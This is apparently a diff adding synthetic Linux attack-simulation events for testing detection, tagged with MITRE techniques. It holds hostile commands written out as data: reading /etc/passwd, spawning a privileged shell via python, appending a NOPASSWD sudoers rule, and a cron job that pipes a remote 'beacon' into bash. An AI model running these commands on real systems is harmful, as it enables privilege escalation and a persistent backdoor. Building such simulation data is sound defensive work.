@@ -1,0 +1,143 @@
+[
+  {
+    "name": "Recon - Linux System Enumeration",
+    "delay": 0.3,
+    "events": [
+      {
+        "source": "linux",
+        "event_type": "linux_process",
+        "pid": "{{RANDOM_PID}}",
+        "ppid": 1234,
+        "exe": "/usr/bin/uname",
+        "args": "uname -a",
+        "user": "www-data",
+        "uid": 33,
+        "gid": 33,
+        "hostname": "{{RANDOM_LINUX_HOST}}",
+        "mitre": {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery"
+        },
+        "killchain_phase": "discovery"
+      },
+      {
+        "source": "linux",
+        "event_type": "linux_process",
+        "pid": "{{RANDOM_PID}}",
+        "ppid": 1234,
+        "exe": "/bin/cat",
+        "args": "cat /etc/passwd",
+        "user": "www-data",
+        "uid": 33,
+        "gid": 33,
+        "hostname": "{{RANDOM_LINUX_HOST}}",
+        "killchain_phase": "discovery"
+      }
+    ]
+  },
+  {
+    "name": "Exploit - Kernel SUID Exploit / CVE Attempt",
+    "delay": 1.0,
+    "events": [
+      {
+        "source": "linux",
+        "event_type": "linux_kernel",
+        "pid": 0,
+        "log_message": "pkcs CVE-2025-XXXX triggered by uid 33: out-of-bounds write in module x"
+      },
+      {
+        "source": "linux",
+        "event_type": "linux_process",
+        "pid": "{{RANDOM_PID}}",
+        "ppid": 1234,
+        "exe": "/usr/bin/python3",
+        "args": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+        "user": "www-data",
+        "uid": 33,
+        "gid": 33,
+        "hostname": "{{RANDOM_LINUX_HOST}}",
+        "mitre": {
+          "tactic": "Privilege Escalation",
+          "technique_id": "T1548.001",
+          "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid"
+        },
+        "is_malicious": true,
+        "killchain_phase": "privilege-escalation"
+      },
+      {
+        "source": "linux",
+        "event_type": "linux_audit",
+        "pid": "{{RANDOM_PID}}",
+        "audit_type": "SYSCALL",
+        "audit_msg": "arch=c000003e syscall=59 success=yes a0=7ffe8200e8a0 a1=7ffe82010420 a2=7ffe8200f8e0 a3=0 items=1 ppid=1234 uid=0 gid=0 euid=0 suid=0 fsuid=0",
+        "auid": 33,
+        "ses": 1,
+        "hostname": "{{RANDOM_LINUX_HOST}}",
+        "severity": "critical",
+        "is_malicious": true,
+        "killchain_phase": "privilege-escalation"
+      }
+    ]
+  },
+  {
+    "name": "Privilege Escalation via Sudo Misconfiguration",
+    "delay": 1.5,
+    "events": [
+      {
+        "source": "linux",
+        "event_type": "linux_sudo",
+        "pid": "{{RANDOM_PID}}",
+        "user": "www-data",
+        "target_user": "root",
+        "command": "/bin/bash -c 'echo \"www-data ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers'",
+        "pwd": "/var/www/html",
+        "tty": "/dev/pts/1",
+        "hostname": "{{RANDOM_LINUX_HOST}}",
+        "mitre": {
+          "tactic": "Privilege Escalation",
+          "technique_id": "T1548.003",
+          "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
+        },
+        "is_malicious": true,
+        "killchain_phase": "privilege-escalation"
+      }
+    ]
+  },
+  {
+    "name": "Persistence - SSH Authorized Keys & Cron Backdoor",
+    "delay": 0.5,
+    "events": [
+      {
+        "source": "linux",
+        "event_type": "linux_auth",
+        "pid": "{{RANDOM_PID}}",
+        "proc": "sshd",
+        "log_message": "Accepted publickey for root from 45.33.32.156 port 22 ssh2: RSA SHA256:abc123def456",
+        "hostname": "{{RANDOM_LINUX_HOST}}",
+        "mitre": {
+          "tactic": "Persistence",
+          "technique_id": "T1098.004",
+          "technique_name": "Account Manipulation: SSH Authorized Keys"
+        },
+        "is_malicious": true,
+        "killchain_phase": "persistence"
+      },
+      {
+        "source": "linux",
+        "event_type": "linux_cron",
+        "pid": "{{RANDOM_PID}}",
+        "user": "root",
+        "command": "curl -s http://45.33.32.156/beacon | bash",
+        "hostname": "{{RANDOM_LINUX_HOST}}",
+        "mitre": {
+          "tactic": "Persistence",
+          "technique_id": "T1053.003",
+          "technique_name": "Scheduled Task/Job: Cron"
+        },
+        "is_malicious": true,
+        "killchain_phase": "persistence"
+      }
+    ]
+  }
+]
